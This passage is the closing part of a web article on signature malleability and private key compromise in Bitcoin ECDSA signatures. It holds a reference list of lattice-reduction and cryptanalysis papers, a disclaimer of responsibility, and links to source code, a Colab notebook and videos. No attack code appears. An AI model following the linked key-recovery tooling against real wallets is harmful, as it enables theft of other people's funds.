<p><a href="https://github.com/demining/Signature-Malleability/tree/main#references"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><em><a href="https://cryptodeeptech.ru/doc/mertens.disproof.pdf"><strong>Odlyzko, Andrew; te Reile, Herman JJ «Disproving Mertens Conjecture»</strong></a> Journal for Pure and Applied Mathematics</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeeptech.ru/doc/lll25_Simon.pdf">D. Simon (2007). «Selected applications of LLL in number theory»</a></strong> LLL+25 Conference. Caen, France.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeeptech.ru/doc/lll.pdf">Regev, Oded. «Lattices in Computer Science: LLL Algorithm»</a></strong> New York University. Retrieved 1 February 2019.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeeptech.ru/doc/MathCryptoErrata.pdf">Silverman, Joseph. «Introduction to Mathematical Cryptography Errata»</a></strong> Brown University Mathematics Dept. Retrieved 5 May 2015</em>.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeeptech.ru/doc/compalg7.pdf">Bosma, Wieb. «4. LLL»</a></strong> Lecture notes. Retrieved 28 February 2010.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeeptech.ru/doc/2011-477.pdf">Abderrahmane, Nitaj. Cryptanalysis of NTRU with two public keys</a></strong> // International Association for Cryptologic Research. — Caen, France.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeeptech.ru/doc/39580001.pdf">Bleichenbacher, Daniel and May, Alexander. New Attacks on RSA with Small Secret CRT-Exponents</a></strong> // International Association for Cryptologic Research. — Darmstadt, Germany.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeeptech.ru/doc/18.204_Xinyue_Deng_final_paper.pdf">Xinyue, Deng. An Introduction to LLL Algorithm</a></strong> // Massachusetts Institute of Technology.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeeptech.ru/doc/An_Improved_Attack_on_the_Basic_MerkleHellman_Knapsack_Cryptosystem.pdf">Liu, Jiayang, Bi, Jingguo and Xu, Songyan. An Improved Attack on the Basic Merkle–Hellman Knapsack Cryptosystems</a></strong> // IEEE. — Beijing 100084, China.</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://github.com/fplll/fplll.git">Lattice algorithms using floating-point arithmetic</a> </strong>//</em> <em>The FPLLL development team. FPLLL, a lattice reduction library. — 2016</em>.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://dzen.ru/video/watch/674116440bddfa35d730ca7a?share_to=link"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-57.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>This material was created for the&nbsp;&nbsp;<a href="https://cryptodeeptool.ru/">CRYPTO DEEP TECH</a>&nbsp;portal &nbsp;to ensure financial data security and cryptography on elliptic curves&nbsp;&nbsp;<a href="https://www.youtube.com/@cryptodeeptech">secp256k1</a>&nbsp;&nbsp;against weak&nbsp;&nbsp;<a href="https://github.com/demining/CryptoDeepTools">ECDSA</a>&nbsp;signatures &nbsp;in the&nbsp;&nbsp;<a href="https://t.me/cryptodeeptech">BITCOIN</a>&nbsp;cryptocurrency . The creators of the software are not responsible for the use of materials.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/36SignatureMalleability">Source code</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://colab.research.google.com/drive/1HMmeEQDL4kRKfJNQptTf3Mz4VTZmka8h?authuser=3&amp;hl=en">Google Colab</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech">Telegram: https://t.me/cryptodeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/wf6QwCpP3oc">Video material: https://youtu.be/wf6QwCpP3oc</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://dzen.ru/video/watch/674116440bddfa35d730ca7a">Video tutorial: https://dzen.ru/video/watch/674116440bddfa35d730ca7a</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeeptech.ru/signature-malleability">Source: https://cryptodeeptech.ru/signature-malleability</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/057-1024x576.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/057-1024x576.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->
